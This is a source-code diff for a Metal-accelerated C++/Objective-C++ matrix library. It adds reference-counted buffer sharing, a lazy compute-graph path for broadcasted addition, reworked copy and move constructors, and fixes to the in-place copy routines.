@@ -57,7 +57,6 @@ typedef uint16_t uint16;
 #include <mlx/mlx.h>
 #include <span>
 #import "Matrix.mm"
-//#include "TestTracer.h"
 #include <random>
 #include <map>
 #include <utility>
@@ -67,12 +66,15 @@ typedef uint16_t uint16;
 #include <vector>
 #include <map>
 #include <Accelerate/Accelerate.h>
+#include <fstream>
+
 @import GPUManager;
 @import GeometryNode;
 @import Utils;
 @import Camera3D;
 #import <SwiftUI/SwiftUI.h>
-
+#include <atomic>
+#include "cpu_rasteriser.hpp"
 //#include "FaceLandmarkWrapper.h"
 //#include <mediapipe/mediapipe/framework/calculator_graph.h>
 
@@ -82,10 +84,10 @@ typedef uint16_t uint16;
 #pragma once // <--- 1. Prevents recursive inclusion
 #define SAFE_MODE
 
-//#define CreationLog
-//#define DestructionLog
-//#define CopyLog
-//#define MoveLog
+#define CreationLog
+#define DestructionLog
+#define CopyLog
+#define MoveLog
 
 
 int mediapipe_xcode_dylib_dummy_symbol();
@@ -169,22 +171,7 @@ void reverseBuffer(const T* src, T* des, size_t len) {
     }
 }
 
-void PatternFill(void* destination, const void* pattern, size_t patternSize, uint32_t n) {
-    uint32_t exp = 0;
-    uint32_t pO2 = 1;
-    while ((1u << (exp + 1)) <= n) {
-        ++exp;
-    }
-    
-    memcpy(destination, pattern, patternSize);
-    for (int i = 1; i < exp+1; i++) {
-        memcpy((char*)destination + patternSize * pO2, destination, patternSize*pO2);
-        // ByteShift To Multiply By 2
-        pO2 <<= 1;
-    }
-    
-    memcpy((char*)destination + patternSize * ((int)pO2), destination, (n - pO2) * patternSize);
-}
+
 
 class Timer {
 public:
@@ -341,19 +328,19 @@ enum class DType : int {
     Unknown      = -1
 };
 
-template<typename T> constexpr DType dtype_from_type();
+template<typename T> constexpr DType dtype_from_typeH();
 
-template<> constexpr DType dtype_from_type<float>()        { return DType::Float; }
-template<> constexpr DType dtype_from_type<float16_t>()  { return DType::Float16; }
-template<> constexpr DType dtype_from_type<uint8_t>()      { return DType::UInt8; }
-template<> constexpr DType dtype_from_type<int>()          { return DType::Int32; }
-template<> constexpr DType dtype_from_type<int16_t>()      { return DType::Int16; }
-template<> constexpr DType dtype_from_type<uint16_t>()     { return DType::UInt16; }
-template<> constexpr DType dtype_from_type<uint32_t>()     { return DType::UInt32; }
-template<> constexpr DType dtype_from_type<simd_float2>()  { return DType::Float2; }
-template<> constexpr DType dtype_from_type<simd_float3>()  { return DType::Float3; }
-template<> constexpr DType dtype_from_type<Point3D>()  { return DType::Float3; }
-template<> constexpr DType dtype_from_type<simd_float4>()  { return DType::Float4; }
+template<> constexpr DType dtype_from_typeH<float>()        { return DType::Float; }
+template<> constexpr DType dtype_from_typeH<float16_t>()  { return DType::Float16; }
+template<> constexpr DType dtype_from_typeH<uint8_t>()      { return DType::UInt8; }
+template<> constexpr DType dtype_from_typeH<int>()          { return DType::Int32; }
+template<> constexpr DType dtype_from_typeH<int16_t>()      { return DType::Int16; }
+template<> constexpr DType dtype_from_typeH<uint16_t>()     { return DType::UInt16; }
+template<> constexpr DType dtype_from_typeH<uint32_t>()     { return DType::UInt32; }
+template<> constexpr DType dtype_from_typeH<simd_float2>()  { return DType::Float2; }
+template<> constexpr DType dtype_from_typeH<simd_float3>()  { return DType::Float3; }
+template<> constexpr DType dtype_from_typeH<Point3D>()  { return DType::Float3; }
+template<> constexpr DType dtype_from_typeH<simd_float4>()  { return DType::Float4; }
 
 
 template<DType code> struct type_dtype;
@@ -371,7 +358,7 @@ template<> struct type_dtype<DType::Float4>  { using type = simd_float4; };
 
 
 template<DType code>
-using type_from_dtype = typename type_dtype<code>::type;
+using type_from_dtypes = typename type_dtype<code>::type;
 
 
 
@@ -471,11 +458,7 @@ struct nested_initializer_list<T, 0> {
     using type = T;
 };
 
-enum Flags : unsigned int {
-    NON_OWNERSHIP_FLAG = 1u << 0,  // Bit 0
-    NON_CONTIGUOUS_FLAG = 1u << 1,  // Bit 1
-    COMPUTE_GRAPH = 1u << 2 // Bit 2
-};
+
 
 
 class OppNode {
@@ -539,10 +522,10 @@ public:
 };
 
 // Range type for slicing
-struct Range {
-    int start, end;
-    constexpr Range(int s, int e) : start(s), end(e) {}
-};
+//struct Range {
+//    int start, end;
+//    constexpr Range(int s, int e) : start(s), end(e) {}
+//};
 
 // Proxy object to enable colon syntax
 struct Slice {
@@ -617,20 +600,20 @@ inline void setBufferOrBytes(id<MTLComputeCommandEncoder> commandEncoder,
 //    }
 //}
 enum class OpType { NONE, ADD, MATMUL };
-struct Primitive {
+struct PrimitiveH {
     OpType op;
-    Primitive(OpType o = OpType::NONE) : op(o) {}
-    virtual ~Primitive() = default;
+    PrimitiveH(OpType o = OpType::NONE) : op(o) {}
+    virtual ~PrimitiveH() = default;
     virtual void evaluate_inputs(MatrixBase* output) = 0;
 };
 
 template <int dims, typename Type>
-struct SimmilarPrimitive : public Primitive {
+struct SimmilarPrimitiveH : public PrimitiveH {
     std::shared_ptr<MatrixH<dims, Type>> Mat1;
     std::shared_ptr<MatrixH<dims, Type>> Mat2;
 
-    SimmilarPrimitive(OpType o, std::shared_ptr<MatrixH<dims, Type>> m1, std::shared_ptr<MatrixH<dims, Type>> m2)
-        : Primitive(o), Mat1(m1), Mat2(m2) {}
+    SimmilarPrimitiveH(OpType o, std::shared_ptr<MatrixH<dims, Type>> m1, std::shared_ptr<MatrixH<dims, Type>> m2)
+        : PrimitiveH(o), Mat1(m1), Mat2(m2) {}
 
     // NEW: Implement the bridge to traverse further down
     void evaluate_inputs(MatrixBase* output) override {
@@ -642,8 +625,25 @@ struct SimmilarPrimitive : public Primitive {
     }
 };
 
+template <int dims, typename Type>
+struct AdditionPrimitiveH : public PrimitiveH {
+    MatrixH<dims, Type> Mat1;
+    MatrixH<dims, Type> Mat2;
+
+    AdditionPrimitiveH(OpType o, const MatrixH<dims, Type>& m1, const MatrixH<dims, Type>& m2)
+        : PrimitiveH(o), Mat1(m1), Mat2(m2) {}
+
+    // NEW: Implement the bridge to traverse further down
+    void evaluate_inputs(MatrixBase* output) override {
+        Mat1.evaluate(false);
+        Mat2.evaluate(false);
+
+//        Mat1.BroadcastedAdd(*static_cast<MatrixH<dims, Type>*>(output), Mat2, Execution::Encode);
+    }
+};
+
 template <int InDims, int OutDims, typename Type>
-struct UnsqeezePrimitive : public Primitive {
+struct UnsqeezePrimitive : public PrimitiveH {
     std::shared_ptr<MatrixH<InDims, Type>> input;
     int axis;
 
@@ -665,7 +665,7 @@ public:
     size_t total_size;
     id<MTLBuffer> metalBuffer = nil;
     uint8_t flags = 0;
-    Primitive* tape = nullptr;
+    PrimitiveH* tape = nullptr;
     std::atomic<uint32_t>* refCount = nil;
 //    kes
 //    using ParentList = std::vector<std::shared_ptr<MatrixH<dims, Type>>>;
@@ -681,7 +681,7 @@ public:
     
     
     using initializer_type = typename nested_initializer_list<Type, dims>::type;
-    MatrixH(initializer_type nestedList) requires (dims != 0) : MatrixBase(dims, dtype_from_type<Type>())  {
+    MatrixH(initializer_type nestedList) requires (dims != 0) : MatrixBase(dims, dtype_from_typeH<Type>())  {
         total_size = 1;
         computeShape(nestedList, 0);
         buffer = new Type[total_size];
@@ -697,7 +697,7 @@ public:
     }
     
     MatrixH()
-      : MatrixBase(dims, dtype_from_type<Type>()), buffer(nullptr), total_size(0), metalBuffer(nullptr) {
+      : MatrixBase(dims, dtype_from_typeH<Type>()), buffer(nullptr), total_size(0), metalBuffer(nullptr) {
         #ifdef CreationLog
         std::cout << "Created" << "\n";
         #endif
@@ -737,7 +737,7 @@ public:
         
     };
     
-    MatrixH(Type value, bool buildGPUBuffer = true) requires (dims == 0) : MatrixBase(0, dtype_from_type<Type>()) {
+    MatrixH(Type value, bool buildGPUBuffer = true) requires (dims == 0) : MatrixBase(0, dtype_from_typeH<Type>()) {
         #ifdef CreationLog
         std::cout << "Created" << "\n";
         #endif
@@ -750,7 +750,7 @@ public:
     }
     
     
-    explicit MatrixH(size_t reserveCapacity) requires (dims != 0) : MatrixBase(dims, dtype_from_type<Type>()) {
+    explicit MatrixH(size_t reserveCapacity) requires (dims != 0) : MatrixBase(dims, dtype_from_typeH<Type>()) {
         #ifdef CreationLog
         std::cout << "Created" << "\n";
         #endif
@@ -810,7 +810,15 @@ public:
         
     }
     
-    void evaluate() {
+    MatrixH<dims, Type> cloneDescription() {
+        MatrixH<dims, Type> result;
+        result.total_size = total_size;
+        memcpy(result.shape, shape, dims * sizeof(size_m));
+        memcpy(result.strides, strides, dims * sizeof(size_m));
+        return result;
+    }
+    
+    void evaluate(bool leafNode = true) {
         if (tape) {
             // 1. Recursively go down the graph to ensure inputs are ready
             tape->evaluate_inputs(this);
@@ -821,6 +829,11 @@ public:
 //                auto casted_tape = static_cast<SimmilarPrimitive<dims, Type>*>(tape);
 //                casted_tape->Mat1->BroadcastedAdd(*this, *casted_tape->Mat2);
 //            }
+            if (leafNode) {
+                [GlobalGPUManager.gCommandEncoder endEncoding];
+                [GlobalGPUManager.gCommandBuffer commit];
+                [GlobalGPUManager.gCommandBuffer waitUntilCompleted];
+            }
         }
 //        is_computed = true; // Mark as done so we don't calculate it twice
         }
@@ -842,6 +855,34 @@ public:
         memcpy(result.strides, strides, sizeof(size_m) * dims);
         result.buildMetalBuffer();
         return result;
+    }
+    static MatrixH<dims, Type> share_with_matrix(matrix& mat) { // Pass by reference to modify it
+        MatrixH<dims, Type> out_mat;
+        
+        if (dims != mat.dims) {
+            std::cerr << "MatrixH: Invalid Conversion dims are different\n";
+            return out_mat; // Return empty/invalid mat
+        }
+
+        // 1. Copy Metadata
+        out_mat.buffer = (Type*)mat.buffer;
+        out_mat.metalBuffer = mat.metalBuffer;
+        out_mat.total_size = mat.total_size;
+        memcpy(out_mat.shape, mat.shape(), dims * sizeof(size_m));
+        memcpy(out_mat.strides, mat.strides(), dims * sizeof(size_m));
+
+        // 2. Manage Reference Counting
+        if (mat.refCount) {
+            // If it already has a counter, just point to it and increment
+            out_mat.refCount = mat.refCount;
+            out_mat.refCount->fetch_add(1, std::memory_order_relaxed);
+        } else {
+            // If mat was "raw", initialize the counter for both
+            out_mat.refCount = new std::atomic<uint32_t>(2);
+            mat.refCount = out_mat.refCount;
+        }
+
+        return out_mat; // Don't forget to return!
     }
     
     
@@ -2188,33 +2229,33 @@ public:
         [commandEncoder setBytes:res.stridesB  length:cdims * sizeof(size_m) atIndex:3];
         [commandEncoder setBytes:&offset length:sizeof(int) atIndex:4];
         if (cdims == 1) {
-            if (!GlobalGPUManager.CopyInplace[typeCode][0]) {
-                GlobalGPUManager.initCopyInplace(typeCode, 0);
+            if (!GlobalGPUManager.CopyInplace[typeCode][typeCode][0]) {
+                GlobalGPUManager.initCopyInplace(typeCode, typeCode, 0);
             }
-            [commandEncoder setComputePipelineState:GlobalGPUManager.CopyInplace_ComputeState[typeCode][0]];
+            [commandEncoder setComputePipelineState:GlobalGPUManager.CopyInplace_ComputeState[typeCode][typeCode][0]];
         } else if (cdims == 2) {
-            if (!GlobalGPUManager.CopyInplace[typeCode][1]) {
-                GlobalGPUManager.initCopyInplace(typeCode, 1);
+            if (!GlobalGPUManager.CopyInplace[typeCode][typeCode][1]) {
+                GlobalGPUManager.initCopyInplace(typeCode, typeCode, 1);
             }
             _dispatchExecutionSize =  MTLSizeMake(res.shape[1], res.shape[0], 1);
-            [commandEncoder setComputePipelineState:GlobalGPUManager.CopyInplace_ComputeState[typeCode][1]];
+            [commandEncoder setComputePipelineState:GlobalGPUManager.CopyInplace_ComputeState[typeCode][typeCode][1]];
         } else if (cdims == 3) {
-            if (!GlobalGPUManager.CopyInplace[typeCode][2]) {
-                GlobalGPUManager.initCopyInplace(typeCode, 2);
+            if (!GlobalGPUManager.CopyInplace[typeCode][typeCode][2]) {
+                GlobalGPUManager.initCopyInplace(typeCode, typeCode, 2);
             }
             _dispatchExecutionSize =  MTLSizeMake(res.shape[2], res.shape[1], res.shape[0]);
-            [commandEncoder setComputePipelineState:GlobalGPUManager.CopyInplace_ComputeState[typeCode][2]];
+            [commandEncoder setComputePipelineState:GlobalGPUManager.CopyInplace_ComputeState[typeCode][typeCode][2]];
         
         } else {
-            if (!GlobalGPUManager.CopyInplace[typeCode][3]) {
-                GlobalGPUManager.initCopyInplace(typeCode, 3);
+            if (!GlobalGPUManager.CopyInplace[typeCode][typeCode][3]) {
+                GlobalGPUManager.initCopyInplace(typeCode, typeCode, 3);
             }
             size_m acc = 1;
             for (int i = 0; i < cdims-2; i++) {acc *= res.shape[i]; }
             _dispatchExecutionSize =  MTLSizeMake(res.shape[cdims-1], res.shape[cdims-2], acc);
             [commandEncoder setBytes:res.shape length:cdims * sizeof(size_m) atIndex:5];
             [commandEncoder setBytes:&cdims length:sizeof(uint32_t) atIndex:6];
-            [commandEncoder setComputePipelineState:GlobalGPUManager.CopyInplace_ComputeState[typeCode][3]];
+            [commandEncoder setComputePipelineState:GlobalGPUManager.CopyInplace_ComputeState[typeCode][typeCode][3]];
         }
         
         
@@ -2251,7 +2292,7 @@ public:
             }
         } else if (cdims == 2) {
             if (res.stridesA[cdims-1] == 1 && res.stridesB[cdims-1] == 1) {
-                for (uint32_t i = 0; i < res.shape[0]; i++) { memcpy(outMat.buffer + res.stridesA[0] * i, outMat.buffer + res.stridesB[0] * i, res.shape[1] * sizeof(Type)); }
+                for (uint32_t i = 0; i < res.shape[0]; i++) { memcpy(outMat.buffer + res.stridesA[0] * i, inMat.buffer + res.stridesB[0] * i, res.shape[1] * sizeof(Type)); }
                 return;
             }
             for (uint32_t i = 0; i < res.shape[0]; i++) {
@@ -2261,7 +2302,7 @@ public:
         } else if (cdims == 3) {
             if (res.stridesA[cdims-1] == 1 && res.stridesB[cdims-1] == 1) {
                 for (uint32_t i = 0; i < res.shape[0]; i++) {
-                    for (uint32_t j = 0; j < res.shape[1]; j++) { memcpy(outMat.buffer + res.stridesA[0] * i + res.stridesA[1] * j, outMat.buffer + res.stridesB[0] * i + res.stridesB[1] * j, res.shape[2] * sizeof(Type)); }
+                    for (uint32_t j = 0; j < res.shape[1]; j++) { memcpy(outMat.buffer + res.stridesA[0] * i + res.stridesA[1] * j, inMat.buffer + res.stridesB[0] * i + res.stridesB[1] * j, res.shape[2] * sizeof(Type)); }
                 }
                 return;
             }
@@ -2289,14 +2330,14 @@ public:
                 }
                 if (res.stridesA[cdims-1] == 1 && res.stridesB[cdims-1] == 1) {
                     for (uint32_t i = 0; i < res.shape[0]; i++) {
-                        for (uint32_t j = 0; j < res.shape[1]; j++) { memcpy(outMat.buffer + res.stridesA[cdims-3] * i + res.stridesA[cdims-2] * j, outMat.buffer + res.stridesB[cdims-3] * i + res.stridesB[cdims-2] * j, res.shape[dims-1] * sizeof(Type)); }
+                        for (uint32_t j = 0; j < res.shape[1]; j++) { memcpy(outMat.buffer + res.stridesA[cdims-3] * i + res.stridesA[cdims-2] * j, inMat.buffer + res.stridesB[cdims-3] * i + res.stridesB[cdims-2] * j, res.shape[dims-1] * sizeof(Type)); }
                     }
                     break;
                 }
                 for (uint32_t i = 0; i < res.shape[cdims-3]; i++) {
                     for (uint32_t j = 0; j < res.shape[cdims-2]; j++) {
                         for (uint32_t k = 0; k < res.shape[cdims-1]; k++) {
-                            outMat.buffer[outMatIndex + i * res.stridesA[cdims-3] + j * res.stridesA[cdims-2] + k * res.stridesA[cdims-1]] = inMat.buffer[inMatIndex + i * res.stridesB[cdims-3] + j * res.strides[cdims-2] + k * inMat.strides[cdims-1]];
+                            outMat.buffer[outMatIndex + i * res.stridesA[cdims-3] + j * res.stridesA[cdims-2] + k * res.stridesA[cdims-1]] = inMat.buffer[inMatIndex + i * res.stridesB[cdims-3] + j * res.stridesB[cdims-2] + k * inMat.strides[cdims-1]];
                         }
                     }
                 }
@@ -3201,7 +3242,7 @@ public:
         return result;
     }
     
-    static MatrixH<3, uint8_t> fromImage(std::string path_str = std::string("/Users/adityadude/Documents/TUSHU.HEIC")) {
+    static MatrixH<3, uint8_t> fromImage(std::string path_str = std::string("/Users/adityadude/Documents/TUSHU.HEIC"), CFDictionaryRef* meta_out = nullptr) {
         #if !TARGET_OS_IPHONE
         CFStringRef path = CFStringCreateWithCString(NULL, path_str.c_str(), kCFStringEncodingUTF8);
         CFURLRef url = CFURLCreateWithFileSystemPath(NULL, path, kCFURLPOSIXPathStyle, false);
@@ -3221,6 +3262,9 @@ public:
         CGImageRef cgImage = image.CGImage;
         #endif
 
+        if (meta_out && source)
+            *meta_out = CGImageSourceCopyPropertiesAtIndex(source, 0, nullptr);
+        
         if (!cgImage) {
             std::cerr << "Failed to create CGImage" << std::endl;
         }
@@ -5137,7 +5181,7 @@ public:
 
     
     template <int dimsB, int resultDims>
-    void BroadcastedAdd(MatrixH<resultDims, Type>& result, const MatrixH<dimsB, Type> &other) const {
+    void BroadcastedAdd(MatrixH<resultDims, Type>& result, const MatrixH<dimsB, Type> &other, Execution execType = Execution::EncodeAndExecute) const {
 //        result.parentNodes.push_back(std::make_shared<MatrixH<dims, Type>>(*this));
 //        result.parentNodes.push_back(std::make_shared<MatrixH<dimsB, Type>>(other));
 //        result.gradFunc = [](MatrixH<dims, Type>& selfs) {
@@ -5193,8 +5237,93 @@ public:
             result.buffer = new Type[result.total_size];
             result.buildMetalBuffer();
         }
-        
         id<MTLCommandQueue> commandQueue = GlobalGPUManager.gCommandQueue;
+        
+        // there will be two runs in first the graph will be build during build normal operators will be called that dont pass any execType so execType = Execution::EncodeAndExecute
+        // run 2: this is when the eval function
+        if ((flags & COMPUTE_GRAPH) && execType != Execution::Encode) {
+            result.flags |= COMPUTE_GRAPH;
+            result.refCount = new std::atomic<uint32>;
+            result.refCount->fetch_add(1);
+            MatrixH<resultDims, Type> x = result.cloneDescription();
+            x.flags = flags;
+            x.refCount = refCount;
+            x.refCount->fetch_add(1, std::memory_order_acq_rel);
+            x.buffer = buffer;
+            x.tape = tape;
+            
+            MatrixH<resultDims, Type> y = result.cloneDescription();
+            y.flags = other.flags;
+            y.refCount = other.refCount;
+            y.refCount->fetch_add(1, std::memory_order_acq_rel);
+            y.buffer = other.buffer;
+            y.tape = other.tape;
+            
+            auto addPrimitive1 = new AdditionPrimitiveH<resultDims, float>(OpType::ADD, std::move(x), std::move(y));
+            result.tape = addPrimitive1;
+            
+            
+            id<MTLCommandBuffer> commandBuffer = GlobalGPUManager.gCommandBuffer;
+            id<MTLComputeCommandEncoder> commandEncoder = GlobalGPUManager.gCommandEncoder;
+            
+            auto _threadsPerThreadgroup = MTLSizeMake(1, 1, 1);
+            auto _dispatchExecutionSize =  MTLSizeMake(result.total_size, 1, 1);
+            int rDims = resultDims;
+            [commandEncoder setBuffer:result.metalBuffer offset:0 atIndex:0];
+            setBufferOrBytes(commandEncoder, *this, 1);
+            setBufferOrBytes(commandEncoder, other, 2);
+            
+            
+            if constexpr (resultDims == 1) {
+                // 1 dim specialisation
+                if (!GlobalGPUManager.BrodcastedAddInit[typeCode][0]) {
+                    GlobalGPUManager.initBrodcastedAddInit(typeCode, 0);
+                }
+                [commandEncoder setBytes:&result.strides length:resultDims * sizeof(size_m) atIndex:3];
+                [commandEncoder setBytes:&strideA length: sizeof(size_m) atIndex:4];
+                [commandEncoder setBytes:&strideB length: sizeof(size_m) atIndex:5];
+                [commandEncoder setComputePipelineState:GlobalGPUManager.BrodcastedAddComputeState[typeCode][0]];
+                _dispatchExecutionSize = MTLSizeMake(result.total_size, 1, 1);
+            } else if constexpr (resultDims == 2) {
+                // 2 dim specialisation
+                if (!GlobalGPUManager.BrodcastedAddInit[typeCode][1]) {
+                    GlobalGPUManager.initBrodcastedAddInit(typeCode, 1);
+                }
+                [commandEncoder setBytes:result.strides length:resultDims * sizeof(size_m) atIndex:3];
+                [commandEncoder setBytes:strideA length:resultDims * sizeof(size_m) atIndex:4];
+                [commandEncoder setBytes:strideB length:resultDims * sizeof(size_m) atIndex:5];
+                [commandEncoder setComputePipelineState:GlobalGPUManager.BrodcastedAddComputeState[typeCode][1]];
+                _dispatchExecutionSize = MTLSizeMake(result.shape[1], result.shape[0], 1);
+            } else if constexpr (resultDims == 3) {
+                // 3 dim specialisation
+                if (!GlobalGPUManager.BrodcastedAddInit[typeCode][2]) {
+                    GlobalGPUManager.initBrodcastedAddInit(typeCode, 2);
+                }
+                [commandEncoder setBytes:result.strides length:resultDims * sizeof(size_m) atIndex:3];
+                [commandEncoder setBytes:strideA length:resultDims * sizeof(size_m) atIndex:4];
+                [commandEncoder setBytes:strideB length:resultDims * sizeof(size_m) atIndex:5];
+                [commandEncoder setComputePipelineState:GlobalGPUManager.BrodcastedAddComputeState[typeCode][2]];
+                _dispatchExecutionSize = MTLSizeMake(result.shape[2], result.shape[1], result.shape[0]);
+            } else {
+                // N dim specialisation
+                if (!GlobalGPUManager.BrodcastedAddInit[typeCode][3]) {
+                    GlobalGPUManager.initBrodcastedAddInit(typeCode, 3);
+                }
+                [commandEncoder setBytes:result.strides length:resultDims * sizeof(size_m) atIndex:3];
+                [commandEncoder setBytes:strideA length:resultDims * sizeof(size_m) atIndex:4];
+                [commandEncoder setBytes:strideB length:resultDims * sizeof(size_m) atIndex:5];
+                [commandEncoder setBytes:result.shape length:rDims * sizeof(size_m) atIndex:6];
+                [commandEncoder setBytes:&rDims length:sizeof(int) atIndex:7];
+                [commandEncoder setComputePipelineState:GlobalGPUManager.BrodcastedAddComputeState[typeCode][3]];
+                _dispatchExecutionSize = MTLSizeMake(result.shape[resultDims-1], result.shape[resultDims-2], result.accumul(0, resultDims-2));
+            }
+            
+            [commandEncoder dispatchThreads:_dispatchExecutionSize
+                      threadsPerThreadgroup:_threadsPerThreadgroup];
+            return;
+        }
+        
+        
         id<MTLCommandBuffer> commandBuffer = [commandQueue commandBuffer];
         id<MTLComputeCommandEncoder> commandEncoder = [commandBuffer computeCommandEncoder];
         
@@ -5253,9 +5382,11 @@ public:
         [commandEncoder dispatchThreads:_dispatchExecutionSize
                   threadsPerThreadgroup:_threadsPerThreadgroup];
         
-        [commandEncoder endEncoding];
-        [commandBuffer commit];
-        [commandBuffer waitUntilCompleted];
+        if (execType == Execution::EncodeAndExecute) {
+            [commandEncoder endEncoding];
+            [commandBuffer commit];
+            [commandBuffer waitUntilCompleted];
+        }
     }
     
     template <int dimsB, int resultDims>
@@ -5725,13 +5856,13 @@ public:
             } else {
                 BrodcastedAddCPU(result, other);
             }
-        } else if (total_size == other.total_size && !(flags & NON_CONTIGUOUS_FLAG)) {
-            result.buffer = new Type[effectiveBufferSize()];
-            result.total_size = total_size;
-            result.buildMetalBuffer();
-            memcpy(result.shape, shape, sizeof(size_m) * dims);
-            memcpy(result.strides, strides, sizeof(size_m) * dims);
-            Add(result, other);
+//        } else if (total_size == other.total_size && !(flags & NON_CONTIGUOUS_FLAG)) {
+//            result.buffer = new Type[effectiveBufferSize()];
+//            result.total_size = total_size;
+//            result.buildMetalBuffer();
+//            memcpy(result.shape, shape, sizeof(size_m) * dims);
+//            memcpy(result.strides, strides, sizeof(size_m) * dims);
+//            Add(result, other);
         } else {
             BroadcastedAdd(result, other);
         }
@@ -6279,24 +6410,36 @@ public:
 //            std::cout << "deleted" << "\n";
 //        }
         if (!(flags & NON_OWNERSHIP_FLAG)) {
-            delete [] buffer;
-            buffer = nullptr;
-            #ifdef DestructionLog
-            std::cout << "deleted" << "\n";
-            #endif
+            if (!refCount) {
+                delete [] buffer;
+                buffer = nullptr;
+                #ifdef DestructionLog
+                std::cout << "deleted" << "\n";
+                #endif
+            } else {
+                if (refCount->fetch_sub(1, std::memory_order_acq_rel) == 1) {
+                    delete[] buffer;
+                    buffer = nullptr;
+                    delete refCount;
+                    refCount = nullptr;
+                    #ifdef DestructionLog
+                    std::cout << "deleted" << "\n";
+                    #endif
+                }
+            }
         }
     }
     
-    MatrixH(const MatrixH<dims, Type>& other) : MatrixBase(dims, dtype_from_type<Type>()) {
+    MatrixH(const MatrixH<dims, Type>& other) : MatrixBase(dims, dtype_from_typeH<Type>()) {
 #ifdef CopyLog
         std::cout << "Copied" << "\n";
 #endif
         // copy constructor doesnt need to delete its buffer as  its called only on uninitlised matricies
 //        if () {
-            buffer = new Type[other.total_size];
-            total_size = other.total_size;
-            metalBuffer = [GlobalGPUManager.metalDevice newBufferWithBytesNoCopy:buffer length:total_size * sizeof(Type) options:MTLResourceStorageModeShared deallocator:^(void * _Nonnull pointer, NSUInteger length) {
-            }];
+//            buffer = new Type[other.total_size];
+//            total_size = other.total_size;
+//            metalBuffer = [GlobalGPUManager.metalDevice newBufferWithBytesNoCopy:buffer length:total_size * sizeof(Type) options:MTLResourceStorageModeShared deallocator:^(void * _Nonnull pointer, NSUInteger length) {
+//            }];
 //        gradFunc = other.gradFunc;
 //        parentNodes = other.parentNodes;
 //        } else if (total_size != other.total_size) {
@@ -6308,15 +6451,48 @@ public:
 //            total_size = other.total_size;
 //
 //        }
-        flags = other.flags; // FIX: We are allocating new buffer, so we own it. Reset the ownership flags.
-        flags &= ~NON_OWNERSHIP_FLAG;
-        memcpy(buffer, other.buffer, sizeof(Type) * total_size);
-        memcpy(shape, other.shape, sizeof(size_m) * dims);
-        memcpy(strides, other.strides, dims * sizeof(size_m));
-        tape = other.tape;
+//        flags = other.flags; // FIX: We are allocating new buffer, so we own it. Reset the ownership flags.
+//        flags &= ~NON_OWNERSHIP_FLAG;
+//        memcpy(buffer, other.buffer, sizeof(Type) * total_size);
+//        memcpy(shape, other.shape, sizeof(size_m) * dims);
+//        memcpy(strides, other.strides, dims * sizeof(size_m));
+//        tape = other.tape;
+    
+        memcpy(shape,   other.shape,   dims * sizeof(size_m));
+        // Copy philosophy is deep copies of NON_CONTIGOUS Buffer results in formation of CONTIGUOUS ONES
+
+        total_size  = other.total_size;
+        flags       = other.flags;
+        tape        = other.tape;
+
+        if (other.refCount) {
+            // ── Shared ownership: just bump the ref count ──
+            buffer      = other.buffer;
+            metalBuffer = other.metalBuffer;
+            refCount    = other.refCount;
+            refCount->fetch_add(1, std::memory_order_relaxed);
+            memcpy(strides, other.strides, dims * sizeof(size_m));
+        } else if (other.flags & NON_OWNERSHIP_FLAG) {
+            buffer      = other.buffer;
+            metalBuffer = other.metalBuffer;
+            memcpy(strides, other.strides, dims * sizeof(size_m));
+        } else {
+            // ── Plain exclusive-ownership source: deep copy ──
+            buffer      = new Type[total_size];
+            buildMetalBuffer();
+            refCount    = nullptr;
+            flags      &= ~NON_OWNERSHIP_FLAG;
+            flags      &= ~NON_CONTIGUOUS_FLAG;
+            if (total_size > 10) {
+                copyGPUinplace(*this, other, 0);
+            } else {
+                copyCPUinplace(*this, other, 0);
+            }
+            calcStrides();
+        }
     }
     
-    MatrixH( MatrixH<dims, Type>&& other) : MatrixBase(dims, dtype_from_type<Type>()) {
+    MatrixH( MatrixH<dims, Type>&& other) noexcept : MatrixBase(dims, dtype_from_typeH<Type>())  {
 #ifdef MoveLog
         std::cout << "Moved" << "\n";
 #endif
@@ -6328,27 +6504,45 @@ public:
         if (buffer) {
             delete [] buffer;
         }
+        
+        
         buffer = other.buffer;
+        metalBuffer = other.metalBuffer;
+        refCount = other.refCount;
+        
         flags = other.flags;
-        other.buffer = nullptr;
+        
         memcpy(shape, other.shape, dims * sizeof(size_m));
         memcpy(strides, other.strides, dims * sizeof(size_m));
-        metalBuffer = other.metalBuffer;
+        
         total_size = other.total_size;
-//        gradFunc = std::move(other.gradFunc);
-//        parentNodes = std::move(other.parentNodes);
-        other.~MatrixH();
+        tape = other.tape;
+        
+        other.buffer = nullptr;
+        other.refCount = nil;
+        other.tape = nullptr;
+        // no need to manage memory of ARC Objects
+//        other.metalBuffer = nil;
+//        other.~MatrixH();
     }
     
     // const fill
     MatrixH<dims, Type>& operator=(Type value) {
-        if (flags & (1u << 1)) {
-            fill_nd_iterative(buffer, shape, strides, dims, value);
+        if (flags & NON_CONTIGUOUS_FLAG) {
+            MatrixH<dims, Type> value_mat_view(1);
+            memcpy(value_mat_view.shape, shape, dims * sizeof(size_m));
+            memset(value_mat_view.strides, 0, (dims-1) * sizeof(size_m));
+            value_mat_view[dims-1] = 0;
+            value_mat_view.total_size = total_size;
+            value_mat_view.flags |= NON_CONTIGUOUS_FLAG;
+            if (metalBuffer) {
+                copyGPUinplace(*this, value_mat_view, 0);
+            } else {
+                copyCPUinplace(*this, value_mat_view, 0);
+            }
         } else {
-            std::fill(buffer, buffer+total_size, value);
-//            memset(buffer, 0, total_size * sizeof(Type));
+            TypedPatternFill(buffer, value, (size_m)total_size);
         }
-        
         return *this;
     }
     
@@ -6390,65 +6584,97 @@ public:
         return *this;
     }
     
+    void destroyInstance() {
+        if (flags & NON_OWNERSHIP_FLAG) return; // Non-owning view, never deletes
+
+        if (refCount) {
+            if (refCount->fetch_sub(1, std::memory_order_acq_rel) == 1) {
+                delete[] buffer;
+                delete refCount;
+            }
+        } else if (buffer) {
+            delete[] buffer;
+        }
+
+        buffer    = nullptr;
+        refCount  = nullptr;
+    }
+
     
     // copy assignment
     MatrixH<dims, Type>& operator=(const MatrixH<dims, Type>& other) {
-        
+        // To use tape one must be ref counted
         if (&other == this) { }
-        // 2. Data Buffer Check (Same Underlying Data)
-        // If both point to the same memory buffer, copying is redundant.
-        else if (this->buffer == other.buffer) {
-            return *this;
-        }
-        else if (total_size == other.total_size) {
-            if ((flags & NON_CONTIGUOUS_FLAG) || (other.flags & NON_CONTIGUOUS_FLAG)) {
-                
-                size_m indexA[dims];
-                size_m indexB[dims];
-                for (int gid = 0; gid < total_size; gid++) {
-                    int remA = gid;
-                    int remB = gid;
-                    for (int i =dims-1; i >= 0; i--) {
-                        indexA[i] = remA % shape[i];
-                        indexB[i] = remB % other.shape[i];
-                        remA /= shape[i];
-                        remB /= other.shape[i];
-                    }
-                    
